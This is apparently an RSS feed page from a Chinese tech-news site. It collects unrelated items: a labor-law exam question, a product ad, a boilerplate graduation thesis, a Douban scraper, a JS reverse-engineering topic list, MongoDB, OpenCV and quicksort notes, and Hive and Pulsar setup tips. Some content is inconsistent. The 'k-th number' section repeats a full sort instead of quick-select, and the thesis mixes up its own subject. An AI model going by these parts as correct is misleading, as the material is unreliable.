8. 李某是某建筑公司的员工，某日，该公司的建筑工地仓库突发火灾，公司安全副总王某为减少经济损失，在没有采取任何防护措施的情况下，强行要求李某从着火的仓库搬出存放的沥青卷材，并称李某若不服从安排就予以辞退，根据《劳动合同法》，关于李某采取措施的说法，正确的是（ ）。
A. 李某有权不服从王某安排，可以立即解除劳动合同，不需事先告知公司，可以获得经济补偿
B. 李某应当服从王某安排，立即进入仓库搬运沥青卷材，公司应给予经济补偿
C. 李某应当服从王某安排，有权立即解除劳动合同，但需要事先告知公司，可以获得经济补偿
D. 李某有权不服从王某安排，可以立即解除劳动合同，但需要事先告知公司，不能获得经济补偿
【答案】 A</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540085.html</guid><pubDate>Fri, 31 Oct 2025 07:23:34 +0000</pubDate></item><item><title>九盾叉车高位显示器：重塑叉车视界，引领高位精准</title><link>https://www.ppmy.cn/news/1540086.html</link><description>在繁忙的物流与仓储中，叉车不仅是力量与效率的化身，更是精准与安全的守护者。九盾安防，以科技之名，打造叉车高位显示器，彻底革新了货叉升降的盲区挑战，为物流、仓储及码头等领域带来了前所未有的作业体验。
可以看到，在
昏暗、狭窄的仓库深处
，货叉如剑，直指云端，
每一次升降都关乎着货物的安全与效率，
传统的操作方式，风险重重。
九盾安防叉车高位显示器，为叉车装上了一双智慧之眼，7寸高清屏幕，搭配无线高清摄像头，实时传递的镜像
，让货叉的每一次跃动都尽在掌握。
我们不仅在屏幕上做足功课，更在细节处精益求精。
新增的激光定位线
，精准的导航，投射出红色的光，
指引货叉精准无误地插入货物，避免任何一丝偏差可能带来的损失
。而那超长续航的13000毫安锂电池，则是这场视觉盛宴的坚实后盾，40小时的工作时长，让安全与效率并驾齐驱。
安装？简单至极！无线摄像头与移动电源，均采用
强磁吸附设计，轻松一贴，即可
稳固如山，无需繁琐布线，彻底告别绞线困扰。而
自带的行车记录功能
，更是为每一次作业留下了清晰的轨迹，
128G的超大存储空间
，让每一份证据都无可辩驳，工作因此变得更加轻松透明。
九盾安防，作为九芯电子旗下的叉车安全旗舰品牌
，我们深知安全之重，责任之巨。
十余年的深耕细作
，让我们拥有了全面的叉车安全产品体系与解决方案，针对不同场景，定制专属策略，为叉车作业的安全与效率保驾护航。选择九盾安防，即是选择了一个更加智慧、更加安全的叉车作业新时代。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540086.html</guid><pubDate>Fri, 31 Oct 2025 07:23:35 +0000</pubDate></item><item><title>Spring Boot构建高效医疗病历B2B交互平台</title><link>https://www.ppmy.cn/news/1540087.html</link><description>第3章 需求分析与可行性分析
3.1 需求分析
伴随着信息行业的蓬勃发展和人们办公自动化意识的增强，学习信息管理部门的工作也越来越繁重，原来的基于B2B平台的医疗病历交互系统已经不能完全满足相关人员使用的需要。为了协助信息开展学习信息管理工作，提高工作效率，充分利用信息行业的现有资源，开发更好的基于B2B平台的医疗病历交互系统势在必行。
本系统采用B/S结构、结合网络数据库开发技术来设计。本系统是一个独立的系统，用来解决学习信息的管理问题。采用JSP技术构建了一个有效而且实用的学习信息管理平台，目的是为高效地完成对学习信息的管理。本系统具有标准基于B2B平台的医疗病历交互系统所具有的现实中完整的学习信息管理步骤，完全的虚拟现实实现。真正实现节约资源、提高效率、业务处理的同时真正实现基于B2B平台的医疗病历交互系统的功能作用。
3.1.1 应用需求分析
服务器 硬件 处理器：Intel 酷睿
内 存：512M 或更大
硬 盘：120G 或更大
软件 Microsoft Windows 10
Mysql5.7
tomcat 7.0
客户机 硬件 无特殊要求，只要能上连接互联网即可
软件 Microsoft Windows 10
360急速浏览器
系统的性能要求通常指系统需要的存储容量以及后援存储，重新启动考虑到运行效率和安全性等方面的问题。系统的硬件环境：Core 5600、1G MB（RAM）、120GB（HD）。运行系统的时候对数据的安全保密性能要求不高，一般对数据不进行加密要求。另外，也不依赖其他的软件，程序有比较好的健壮性。
3.1.2 运行需求分析
硬件条件：局域网；酷睿 CPU、1G RAM、PC机要求10G硬盘以上；打印机。
软件条件：Windows 10 IE6.0以上。
3.1.3 其他需求分析
本次要开发的系统有效率，可理解性、可靠性和可维护性都比较高。用户很容易理解和学会操作。可维护性包括两种含义，即可读性和可测试性等。可靠性一般是指健壮性和正确性。在开发这个系统的过程中，需要权衡多种矛盾的目标，并在（时间、经费、可能用到的硬件和软件资源等条件）的限制下，使上面所说的各种要求得到最大限度的满足。
3.2 数据流程分析
3.2.1 系统操作流程
图3-1 系统操作流程图
3.2.2 数据增加流程
添加信息时，编号字段由系统自动生成，且不能修改，其他信息由用户输入，之后对数据进行合法判断，合法则写入保存至数据库，不合法则重新输入数据。数据增加流程图：
图3-2 数据增加流程图
3.2.3 数据修改流程
在修改信息时，先选中一条待修改的记录，然后直接输入数据，判断合法性，合法则保存至数据库，不合法重新输入。数据修改流程图如图3-3所示。
图3-3 数据修改流程图
3.2.4 数据删除流程
当用户选定一条记录时，单击删除按钮，会提示用户是否确定删除，然后删除数据库相关内容。数据删除流程图如图3-4所示。
图3-4 数据删除流程图
3.3 可行性研究
现在许多用户的管理方式既困难又浪费时间和成本，很容易出错。所以应该掌握先进的管理方式，从而提高用户的效率和降低成本。基于B2B平台的医疗病历交互系统主要有以下优势：
3.3.1 经济可行性
经济可行性研究是对组织的经济现状和投资能力进行分析，对系统建设运行和维护费用进行估算，对系统建成后可能取得的社会和经济效益进行估计。由于本系统是作为毕业设计由我们自己开发的，在经济上的投入甚微，系统建成之后将为今后学习信息管理提供很大的方便，估算新系统的开发费用和今后的运行、维护费用，本次研究开发的基于B2B平台的医疗病历交互系统可取代传统的学习管理的业务流程，减少人工开支，节省资金，并且可大大提高信息量的取得，缩短信息处理周期，提高信息管理的效率，具有用户使用更简单、界面更直观、权限分配更合理等优点大大减少管理成本。本项目开发经费在经济上是可以接受的，并且本项目实施后可以显著提高工作效率，节省开支。所有开支都不大，所以本项目在经济上是可行的。
3.3.2 技术可行性
技术可行性要考虑利用现有的技术能否顺利的完成开发系统的工作，硬件和软件配置能不能满足开发的需求等。本次要开发的基于B2B平台的医疗病历交互系统用的是是比较流行的JSP技术，用它来创建使用脚本语言，结合HTML代码来制作动态网页。即可快速完成系统的应用程序，不进行编译，容易编写，可直接在服务器端口执行，使用Windows记事本这种普通的文本编辑器，就可以设计编辑，不需要用到浏览器。因此较为简单易学调试也比较简单，软件方面：由于使用的是目前相对成熟发展的B/S模式软件，故软件开发的平台可行,因此在技术上本次开发是绝对可行的。
3.3.3 运行可行性
系统的开发，是典型的Mis开发，主要是对数据的处理，包括数据的收集，数据的变换，及数据的各种报表形式的输出。
新的系统运行后对现行旧的系统带来包括（工作环境、管理方式、组织机构等）的后果以及影响来进行评判和估计。同时更需要考虑到的是：对现有的管理人员进行培训，补充、分析在给出的时间里是不是能完成预定开发系统的任务等。
我国目前技术已经相当的普及信息化，各种工作人员都具备一定的高度的水平，所以本系统在运行上具备了可行性。
3.3.4 时间可行性
从时间上看，在两个月的时间里学习相关知识，并开发基于B2B平台的医疗病历交互系统，时间上是有点紧，但是不是不可能实现，在做毕业设计的这几个月里，我通过努力使得功能应该基本可以实现。
3.3.5 法律可行性
①所用到的技术资料全部都是合法的。
②在开发系统的过程里并没有存在知识产权的问题。
③并无抄袭任何已存在的基于B2B平台的医疗病历交互系统，故没有侵犯版权的问题。
④ 在设计开发系统的过程中并未涉及任何法律上的责任。
综上所述，开发本次系统从经济上、从技术上、从法律上都是完全可靠的。
结论
制作毕业设计的紧张激烈和忙乱的几个月，我有机会做专业的基本理论，从而实现了学以致用。以前我们也有过一些设计的体会，但只不过是设计了一个的模块或一个小系统，而此次的毕业设计则是将所学到的计算机的知识和管理类的知识加以综合来设计出一个适合运行管理的基于B2B平台的医疗病历交互系统。要想设计使用户满意，就需要我们付出更多的努力。我在设计中经常出现一些问题不知该如何解决，在此时指导老师和许多同学给予了我帮助。在设计的过程中增加了于实际接触的机会，不仅培养了我的自学和编程能力，让我在即将离开学校进入社会之前有了一定的资本，提高了我与人沟通的能力。
尽管本次开发设计的项目已经取得一定的成效，但由于用户的需求又在不断更新着，随着进一步发展软件设计的技术和时间的推移，在接下来的开发中丰富和完善系统都是很有必要的，以下三个方面具体的说明了我对本次设计开发的项目构想展望：
1.系统通用性的问题
目前我们可以通过本系统基本实现学习信息管理工作。为增加软件的通用性，我们可以考虑通过系统的二次开发把该系统推广到全国各用户，使整个基于B2B平台的医疗病历交互系统管理工作更加规范完善。
2.系统的完善性问题
本系统虽然实现了学习信息管理工作的申请审批等一般流程，但是在审核申请人材料上，还只能依赖申请人填写的信息进行审核，有些信息的真实性不能在第一时间得到准确反馈，所以对申请人信息的在线核实工作是今后一个努力的方向。
3.与其他部门系统相对接的问题
如何将基于B2B平台的医疗病历交互系统与企业的办公管理系统等相关系统进行有效的对接，实现信息的共享也是今后开发的重点。
致谢
转眼间，大学四年学习即将完成，回首过去几年的校园生活，可谓是苦乐交加，但是最多的还是收获。本论文的工作是在我的导师[XXXX] 教授的悉心指导下完成的，[XXXX] 教授严谨的治学态度和科学的工作方法给了我极大的帮助和影响。在此衷心感谢三年来[XXXX] 老师对我的关心和指导。
感谢学校的老师们不仅无私的传授给我们知识，还教会了我们懂得如何做人，对他们表示由衷的感谢。管理信息系统这个学科的毕设任务非常之繁重，通过这几个月充实又紧张的设计过程，深深的感到学习知识得到了一次飞跃，我相信：这次的毕业设计将为我的大学学习打上一个完整的句号。
另外和我同组同学大家始终团结协作，努力拼搏，增强了我的团队意识，并且我们接下了深厚的友谊，我们自始至终在一种愉快的气氛中学习工作。此次毕业设计对提高我的编程技术、协调团队成员的关系等方面都由许多益处。在此我一并向他们表示感谢。我还要感谢我的母校，以及在学校四年生活中给予我关心和帮助的老师和同学，是他们教会了我专业的知识和怎样做人。经过本次毕业设计还让我懂得了作为一个计算机领域的学生，我们要会的不只是编写代码，还有更重要的就是要有整体掌控系统开发和设计的能力。我要在以后的学习工作当中不断使自己完善。
参考文献
[1] 薛华成.管理信息系统.北京:清华大学出版社,2009.
[2] 黄梯云.管理信息系统导论.机械工业出版社，2011.
[3] 耿祥意，张跃平.JSP实用教程（第二版）.清华大学出版社,2010.10.
[4] 刘斌著.精通JaveWeb 整合开发.电子工业出版社，2012.5 .
[5] 王趾成.软件工程(第二版).大连理工大学出版社.2012.
[6] 萨师煊.数据库系统概论（第四版），高等教育出版社,2011.5.
[7] 陈志泊,李冬梅,王春玲编.数据库原理及应用教程. 北京:人民邮电出版社,2012.3.
[8] 王璞.网页制作三剑客.北京:清华大学出版社.2013.
[9] 吴建,张旭东.JSP网络开发入门与实践.人民邮电出版社,2012.
[10] 杨选辉.信息系统分析与设计.北京：清华大学出版社,2011.</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540087.html</guid><pubDate>Fri, 31 Oct 2025 07:23:38 +0000</pubDate></item><item><title>基于python的网络爬虫实现代码</title><link>https://www.ppmy.cn/news/1540088.html</link><description>以下是一个基于Python的简单网络爬虫实现示例，以爬取豆瓣电影Top250的电影名称和评分为例：
安装必要的库
我们需要安装
requests
库用于发送HTTP请求获取网页内容，
BeautifulSoup
库用于解析HTML页面。
可以使用
pip install requests beautifulsoup4
命令进行安装。
导入相关库
import
requests
from
bs4
import
BeautifulSoup
发送请求并获取页面内容
url
=
'https://movie.douban.com/top250'
headers
=
{
'User - Agent'
:
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
response
=
requests
.
get
(
url
,
headers
=
headers
)
html_content
=
response
.
text
这里设置
User - Agent
头部信息是为了模拟浏览器访问，避免被服务器拒绝访问。
解析页面内容
soup
=
BeautifulSoup
(
html_content
,
'html.parser'
)
movie_list
=
soup
.
find_all
(
'div'
,
class_
=
'hd'
)
score_list
=
soup
.
find_all
(
'span'
,
class_
=
'rating_num'
)
我们通过
BeautifulSoup
的
find_all
方法来查找所有符合条件的HTML标签。这里分别查找包含电影名称的
&lt;div class="hd"&gt;
标签和包含评分的
&lt;span class="rating_num"&gt;
标签。
提取信息
for
movie
,
score
in
zip
(
movie_list
,
score_list
)
:
movie_name
=
movie
.
a
.
span
.
text
print
(
f"电影名称:
{
movie_name
}
, 评分:
{
score
.
text
}
"
)
通过遍历找到的电影名称标签和评分标签，提取出电影名称和评分并打印出来。
如果要进一步扩展这个爬虫：
分页处理
豆瓣电影Top250是分页显示的。可以通过分析页面的URL结构来实现分页爬取。例如，第二页的URL是
https://movie.douban.com/top250?start = 25&amp;filter =
，其中
start
参数表示从第几个电影开始显示。
可以使用循环来遍历不同的页面，修改
start
参数的值来获取所有页面的内容。
for
page
in
range
(
0
,
250
,
25
)
:
url
=
f'https://movie.douban.com/top250?start=
{
page
}
&amp;filter='
# 后续的请求、解析和提取步骤与前面相同
数据存储
可以将爬取到的数据存储到文件或者数据库中。
如果存储到CSV文件中，可以使用
csv
模块。
import
csv
with
open
(
'douban_movies.csv'
,
'w'
,
newline
=
''
,
encoding
=
'utf - 8 - sig'
)
as
csvfile
:
fieldnames
=
[
'电影名称'
,
'评分'
]
writer
=
csv
.
DictWriter
(
csvfile
,
fieldnames
=
fieldnames
)
writer
.
writeheader
(
)
for
movie
,
score
in
zip
(
movie_list
,
score_list
)
:
movie_name
=
movie
.
a
.
span
.
textwriter
.
writerow
(
{
'电影名称'
:
movie_name
,
'评分'
:
score
.
text
}
)
如果存储到数据库（如MySQL），需要安装
mysql - connector - python
库，然后进行数据库连接、创建表和插入数据等操作。
import
mysql
.
connector
mydb
=
mysql
.
connector
.
connect
(
host
=
"localhost"
,
user
=
"your_user"
,
password
=
"your_password"
,
database
=
"your_database"
)
mycursor
=
mydb
.
cursor
(
)
mycursor
.
execute
(
'CREATE TABLE IF NOT EXISTS douban_movies (movie_name VARCHAR(255), score VARCHAR(10))'
)
for
movie
,
score
in
zip
(
movie_list
,
score_list
)
:
movie_name
=
movie
.
a
.
span
.
textsql
=
"INSERT INTO douban_movies (movie_name, score) VALUES (%s, %s)"
val
=
(
movie_name
,
score
.
text
)
mycursor
.
execute
(
sql
,
val
)
mydb
.
commit
(
)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540088.html</guid><pubDate>Fri, 31 Oct 2025 07:23:40 +0000</pubDate></item><item><title>JS逆向应该学习哪些基础知识？</title><link>https://www.ppmy.cn/news/1540089.html</link><description>JS逆向工程中，需要掌握的基础知识领域如下：
‌
JavaScript基础
‌：
变量、数据类型、运算符和表达式
控制流语句（如if-else、循环等）
函数和闭包
对象和数组
异步编程（Promises、async/await）
DOM操作和事件处理
‌
Web开发基础
‌：
HTML和CSS的基础知识，了解网页的结构和样式
HTTP协议和Web服务器的工作原理
浏览器的工作原理和调试技巧（使用Chrome DevTools等）
‌
JavaScript框架和库
‌：
常见的JavaScript框架（如React、Vue、Angular）
理解和分析这些框架如何影响JavaScript代码的执行
‌
网络请求和API
‌：
使用Fetch API、XMLHttpRequest或第三方库（如Axios）进行网络请求
理解JSON、XML等数据格式
学习如何分析和模拟网络请求
‌
逆向工程和安全知识
‌：
学习如何阅读和理解JavaScript代码
掌握代码调试技巧，如设置断点、观察变量等
了解常见的Web安全漏洞和攻击方式（如XSS、CSRF）
学习如何识别和绕过Web应用的保护措施（如反调试、混淆代码等）
‌
工具和技术
‌：
使用代码编辑器（如Visual Studio Code）进行代码编写和调试
学习使用逆向工程工具（如Chrome DevTools、JSEdit、WebAssembly等）
掌握JavaScript的混淆和去混淆技术
‌
持续学习和实践
‌：
跟随行业趋势，学习新的JavaScript技术和框架
参与实际项目，通过实践来巩固和提高你的技能
这些基础知识将为你打下坚实的基础，使你在JS逆向工程中更加游刃有余。那么，你已经学习和掌握了哪些知识？还有哪些需要持续学习和实践的呢？</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540089.html</guid><pubDate>Fri, 31 Oct 2025 07:23:42 +0000</pubDate></item><item><title>【学习笔记】什么是MongoDB</title><link>https://www.ppmy.cn/news/1540090.html</link><description>文章目录
MongoDB 简介
体系结构
数据模型
MongoDB 的特点
MongoDB 简介
学习一个东西就跟认识一个人一样，下面有情MongoDB来做个自我介绍
大家好，俺是MongoDB，是一个
开源
、
高性能
、
无模式的文档型
数据库，当初的设计俺就是用于
简化开发
和
方便扩展
。
俺是NoSQL数据库产品中的一种，是最像关系型数据库(MySQL)的非关系型数据库。
俺支持的数据结构非常松散，是一种类似于JSON 的格式叫
BSON
，所以俺既可以存储比较复杂的数据类型，又相当的灵活。
俺的记录是一个文档，它是一个由
字段
和
值对
(field:value)组成的数据结构。
俺的文档类似于JSON对象，即一个文档认为就是一个对象。字段的数据类型是字符型，俺的值除了使用基本的一些类型外，还可以包括其他文档、普通数组和文档数组。
体系结构
听完MongoDB的自我介绍，我稍微对他有了一定的了解。为了更加方便我们的理解，有请出我们的老成员Mysql
Mysql和MongoDB的对比：
Mysql中有多个数据库，数据库中包含多个数据表，数据表中包含多个行数据。
而MongoDB中同样有多个数据库，但是不同的是，数据库中包含的是
集合
，集合中包含多个
文档
。
我们知道mysql中有字段这一概念，MongoDB与之不同的是
域
这一概念。
区别最大的一点莫过于表连接了，mysql中支持
table joins
来实现表连接，MongoDB 没有像关系型数据库那样直接的表连接概念。
MongoDB是通过
嵌入式文档
来代替多表连接。
数据模型
MongoDB的最小存储单位就是
文档
(document)。文档(document)对应于关系型数据库的行。数据在MongoDB中以
BSON
(Binary-JSON)文档的格式
存储在磁盘上
。
BSON(Binary Serialized Document Format)是一种类json的一种
二进制形式
的存储格式，简称BinaryJSON.BSON和JSON一样，
支持内嵌的文档对象和数组对象
，但是BSON有JSON没有的一些数据类型，如Date和BinData类型。
MongoDB 的特点
那么讲了这么多了，MongoDB有什么特点吗？
MongoDB主要有如下特点:
高性能
:
MongoDB提供高性能的数据持久性。特别是对嵌入式数据模型的支持减少了数据库系统上的I/O活动。索引支持更快的查询，并且可以包含来自嵌入式文档和数组的键，(文本索引解决搜索的需求、TTL索引解决历史数据自动过期的需求、地理位置索引可用于构建各种 020 应用)mmapv1、wiredtiger、mongorocks(rocksdb)、in·memory等多引擎支持满足各种场景需求Gridfs解决文件存储的需求。
高可用性
:
MongoDB的复制工具称为副本集(replicaset)，它可提供自动故障转移和数据冗余。
高扩展性
:
MongoDB提供了水平可扩展性作为其核心功能的一部分。分片将数据分布在一组集群的机器上。(海量数据存储，服务能力水平扩展)从3.4开始，MongoDB支持基于片键创建数据区域。在一个平衡的集群中，MongoDB将一个区域所覆盖的读写只定向到该区域内的那些片。
丰富的查询支持
:
MongoDB支持丰富的查询语言，支持读和写操作(CRUD)，比如数据聚合、文本搜索和地理空间查询等。
其他特点:如无模式(动态模式)、灵活的文档模型</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540090.html</guid><pubDate>Fri, 31 Oct 2025 07:23:44 +0000</pubDate></item><item><title>OpenCV高级图形用户界面(7)获取指定窗口的属性值函数getWindowProperty()的使用</title><link>https://www.ppmy.cn/news/1540091.html</link><description>操作系统：ubuntu22.04
OpenCV版本：OpenCV4.9
IDE:Visual Studio Code
编程语言：C++11
算法描述
提供窗口的参数。
函数
getWindowProperty
返回窗口的属性。
cv::getWindowProperty() 函数用于获取指定窗口的属性值。这个函数允许你查询窗口的各种属性，如窗口的大小、位置或其他特定的属性。
函数的原型
double cv::getWindowProperty
(const String &amp; 	winname,int 	prop_id 
)
参数
参数winname　窗口的名称。
参数prop_id　要检索的窗口属性。以下操作标志可用：（cv::WindowPropertyFlags）
prop_id 参数可以是以下常量之一：
cv::WND_PROP_AUTOSIZE：窗口是否自动调整大小。
cv::WND_PROP_ASPECT_RATIO：窗口的纵横比。
cv::WND_PROP_FULLSCREEN：窗口是否处于全屏模式。
cv::WND_PROP_OPENGL：窗口是否使用 OpenGL 渲染。
cv::WND_PROP_VISIBLE：窗口是否可见。
代码示例
#
include
&lt;opencv2/opencv.hpp&gt;
#
include
&lt;iostream&gt;
int
main
(
)
{
// 加载图像
cv
::
Mat img
=
cv
::
imread
(
"example.jpg"
,
cv
::
IMREAD_COLOR
)
;
if
(
img
.
empty
(
)
)
{
std
::
cerr
&lt;&lt;
"Error: Image not found!"
&lt;&lt;
std
::
endl
;
return
-
1
;
}
// 创建窗口
std
::
string winname
=
"Example Window"
;
cv
::
namedWindow
(
winname
)
;
// 显示图像
cv
::
imshow
(
winname
,
img
)
;
// 获取窗口是否自动调整大小的属性
double
propAutosize
=
cv
::
getWindowProperty
(
winname
,
cv
::
WND_PROP_AUTOSIZE
)
;
std
::
cout
&lt;&lt;
"Window autosize property: "
&lt;&lt;
propAutosize
&lt;&lt;
std
::
endl
;
// 获取窗口是否处于全屏模式的属性
double
propFullscreen
=
cv
::
getWindowProperty
(
winname
,
cv
::
WND_PROP_FULLSCREEN
)
;
std
::
cout
&lt;&lt;
"Window fullscreen property: "
&lt;&lt;
propFullscreen
&lt;&lt;
std
::
endl
;
// 获取窗口是否使用 OpenGL 渲染的属性
double
propOpenGL
=
cv
::
getWindowProperty
(
winname
,
cv
::
WND_PROP_OPENGL
)
;
std
::
cout
&lt;&lt;
"Window OpenGL property: "
&lt;&lt;
propOpenGL
&lt;&lt;
std
::
endl
;
// 获取窗口的可见性属性
double
propVisible
=
cv
::
getWindowProperty
(
winname
,
cv
::
WND_PROP_VISIBLE
)
;
std
::
cout
&lt;&lt;
"Window visible property: "
&lt;&lt;
propVisible
&lt;&lt;
std
::
endl
;
// 等待键盘输入
cv
::
waitKey
(
0
)
;
// 关闭所有窗口
cv
::
destroyAllWindows
(
)
;
return
0
;
}
运行结果
Window autosize property:
1
Window fullscreen property:
0
Window OpenGL property: -1
Window visible property: -1</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540091.html</guid><pubDate>Fri, 31 Oct 2025 07:23:46 +0000</pubDate></item><item><title>沥川的算法学习笔记：基础算法（1）----快速排序</title><link>https://www.ppmy.cn/news/1540092.html</link><description>1.快速排序
快速排序是一种高效的排序算法，它利用了分治的思想。快速排序的基本思想是选择一个基准元素，将数组分成两个子数组，其中一个子数组的元素都小于等于基准元素，另一个子数组的元素都大于等于基准元素，然后对这两个子数组递归地应用快速排序算法。最后将两个子数组合并起来得到排序后的数组。
快速排序的具体步骤如下：
选择一个基准元素，通常是数组中的第一个元素或者随机选择。
将数组分成两个子数组，左边的子数组中的元素都小于等于基准元素，右边的子数组中的元素都大于等于基准元素。可以使用双指针的方式，一个指针从左边开始，一个指针从右边开始，然后交换两个指针所指向的元素，直到两个指针相遇。
对左右两个子数组递归地应用快速排序算法。
将左右两个子数组合并起来得到排序后的数组。
快速排序的时间复杂度为O(nlogn)，其中n为数组的大小。快速排序是一种原地排序算法，不需要额外的空间。但是快速排序是一种不稳定的排序算法，即相同元素的相对位置可能会发生变化。
#include &lt;iostream&gt; // 引入标准输入输出流库
using namespace std; // 使用标准命名空间const int N=1e6+10; // 定义常量N，表示数组的最大容量，1e6+10即1000000+10
int n; // 定义变量n，用于存储待排序元素的数量
int q[N]; // 定义整型数组q，用于存储待排序的元素// 快速排序函数
void quick_sort(int q[], int l, int r) {// 如果左边界索引大于等于右边界索引，说明子数组已经有序，直接返回if(l &gt;= r) return;// 选择子数组的第一个元素作为基准int x = q[l];// 初始化两个指针，i指向左边界的前一个位置，j指向右边界后一个位置int i = l - 1, j = r + 1;// 当i和j没有相遇时，继续循环while(i &lt; j) {// 从左向右移动i，直到找到一个大于等于基准的元素do {i++;} while (q[i] &lt; x);// 从右向左移动j，直到找到一个小于等于基准的元素do {j--;} while (q[j] &gt; x);// 如果i和j没有相遇，交换它们指向的元素if(i &lt; j) swap(q[i], q[j]);}// 递归地对基准左侧的子数组进行快速排序quick_sort(q, l, j);// 递归地对基准右侧的子数组进行快速排序quick_sort(q, j + 1, r);
}int main() {// 从标准输入读取元素数量scanf("%d", &amp;n);// 从标准输入读取待排序的元素for(int i = 0; i &lt; n; i++) {scanf("%d", &amp;q[i]);}// 调用快速排序函数对数组进行排序quick_sort(q, 0, n - 1);// 将排序后的数组输出到标准输出for(int i = 0; i &lt; n; i++) {printf("%d ", q[i]);}// 程序结束，返回0return 0;
}
选择不同位置的基准元素会影响快速排序的性能。基准元素的选择可以影响递归过程中数组的划分效果，从而影响算法的时间复杂度和稳定性。
若选择第一个或最后一个元素作为基准元素：
最好情况：如果数组已经有序或接近有序，选择第一个或最后一个元素作为基准元素可以得到较好的划分效果，此时快速排序的时间复杂度接近O(nlogn)。
最坏情况：如果数组已经有序或接近有序，并且每次选择第一个或最后一个元素作为基准元素，则快速排序的时间复杂度会退化为O(n^2)，这是因为每次划分只能将数组分成两个部分，其中一个部分为空，没有减少问题的规模。
平均情况：平均情况下，选择第一个或最后一个元素作为基准元素可以得到较好的划分效果，快速排序的时间复杂度为O(nlogn)。
若选择随机位置的元素作为基准元素：
通过随机选择基准元素，可以降低最坏情况的概率，避免快速排序时间复杂度退化为O(n^2)。
选择随机位置的元素作为基准元素可以提高快速排序的平均性能，快速排序的时间复杂度为O(nlogn)。
​​​​​​​
2.第K个数----类快排问题
给定一个长度为 n 的整数数列，以及一个整数 k，请用快速选择算法求出数列从小到大排序后的第 k 个数。
输入格式
第一行包含两个整数 n 和 k。
第二行包含 n 个整数（所有整数均在 1∼1091∼109 范围内），表示整数数列。
输出格式
输出一个整数，表示数列的第 k 小数。
分析
本题实际上就是在快速排序的基础上多了找到第k个的元素，实现思路和方法与快排一致：
#include &lt;iostream&gt; // 引入标准输入输出流库
using namespace std; // 使用标准命名空间const int N=1e6+10; // 定义常量N，表示数组的最大容量，1e6+10即1000000+10
int n; // 定义变量n，用于存储待排序元素的数量
int q[N]; // 定义整型数组q，用于存储待排序的元素// 快速排序函数
void quick_sort(int q[], int l, int r) {// 如果左边界索引大于等于右边界索引，说明子数组已经有序，直接返回if(l &gt;= r) return;// 选择子数组的中间元素作为基准int x = q[(l+r)/2];// 初始化两个指针，i指向左边界的前一个位置，j指向右边界后一个位置int i = l - 1, j = r + 1;// 当i和j没有相遇时，继续循环while(i &lt; j) {// 从左向右移动i，直到找到一个大于等于基准的元素do {i++;} while (q[i] &lt; x);// 从右向左移动j，直到找到一个小于等于基准的元素do {j--;} while (q[j] &gt; x);// 如果i和j没有相遇，交换它们指向的元素if(i &lt; j) swap(q[i], q[j]);}// 递归地对基准左侧的子数组进行快速排序quick_sort(q, l, j);// 递归地对基准右侧的子数组进行快速排序quick_sort(q, j + 1, r);
}int main() {// 从标准输入读取元素数量scanf("%d", &amp;n);// 从标准输入读取待排序的元素for(int i = 0; i &lt; n; i++) {scanf("%d", &amp;q[i]);}// 调用快速排序函数对数组进行排序quick_sort(q, 0, n - 1);// 将排序后的数组输出到标准输出for(int i = 0; i &lt; n; i++) {printf("%d ", q[i]);}// 程序结束，返回0return 0;
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540092.html</guid><pubDate>Fri, 31 Oct 2025 07:23:49 +0000</pubDate></item><item><title>hive on tez 指定队列后任务一直处于running状态</title><link>https://www.ppmy.cn/news/1540093.html</link><description>如上图所示一直处于running状态，查看日志发现一直重复弹出同一个info：
2024-10-18 16:57:32,739 [INFO] [AMRM Callback Handler Thread] |rm.YarnTaskSchedulerService|:
Allocated: &lt;memory:0, vCores:0&gt;
释义
: 当前应用程序没有分配到任何内存（
memory:0
）和虚拟核心（
vCores:0
）。这意味着 YARN 还没有给该作业分配任何资源来启动任务。
Free: &lt;memory:1024, vCores:1&gt;
释义
: 当前集群中可用的资源包括 1024MB 的内存和 1 个 vCore（虚拟核心）。虽然有一些空闲资源，但可能不够或者未被分配给当前作业。
pendingRequests: 6
释义
: 当前作业还有 6 个任务在等待资源分配。YARN 还没有为这些任务找到可以运行的容器，作业因此被阻塞。
delayedContainers: 0
释义
: 没有任何延迟分配的容器。通常，当 YARN 没有立即分配到符合要求的资源时，容器会被延迟，直到合适的资源可用。
heartbeats: 3551
释义
: ApplicationMaster (AM) 与 ResourceManager (RM) 之间已经进行了 3551 次心跳通信。这是 YARN 用来监控资源和应用状态的机制。每个心跳之间，RM 会更新 AM 关于资源的状态。
lastPreemptionHeartbeat: 3550
释义
: 这是第 3550 次心跳发送时，ResourceManager 发送的最后一次“抢占心跳”（Preemption Heartbeat）。抢占是 YARN 在资源紧张时的机制，用于重新分配低优先级任务的资源给更高优先级的任务。
highestWaitingRequestWaitStartTime: 1729241801061
义
: 当前队列中等待时间最长的资源请求的开始时间。这个数值是时间戳，通常是从1970年1月1日 UTC 时间以来的毫秒数，代表该任务的等待时间较长
highestWaitingRequestPriority: 32
释义
: 这是当前等待资源的最高优先级请求的优先级值。通常，优先级值越小，优先级越高。32 代表该请求的优先级较低，因此它可能在调度过程中优先级靠后。
重点是：Allocated: &lt;memory:0, vCores:0&gt;和Free: &lt;memory:1024, vCores:1&gt;
先看集群总内存和cores情况，总共132G，75cores：
整个集群明显还有空闲资源，再看对于aviation队列的设置：
configured capacity=5%，表示队列的初始容量百分比，即avation队列在最开始可以使用132G*5%=6.75G，75*5%=3.75cores。
configured max capacity=10%定义了队列使用集群资源的上限，即使其他队列资源空闲，
aviation
队列也不能超过这个上限，即132*10%=13.2G，75*10%=7.5cors
尝试调大configured max capacity至30%，
成功解决：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540093.html</guid><pubDate>Fri, 31 Oct 2025 07:23:51 +0000</pubDate></item><item><title>apache pulsar 安装最新版本， docker安装pulsar3.3.2</title><link>https://www.ppmy.cn/news/1540094.html</link><description>1. 官网地址：
Run a standalone Pulsar cluster in Docker | Apache Pulsar
2. 下载镜像：
2.1 选择镜像版本：
https://hub.docker.com/r/apachepulsar/pulsar/tags
2.2 版本3.3.2
docker pull apachepulsar/pulsar:3.3.2
3. 安装：
3.1 根据官网推荐命令，再次自定义
3.2 创建映射文件夹：
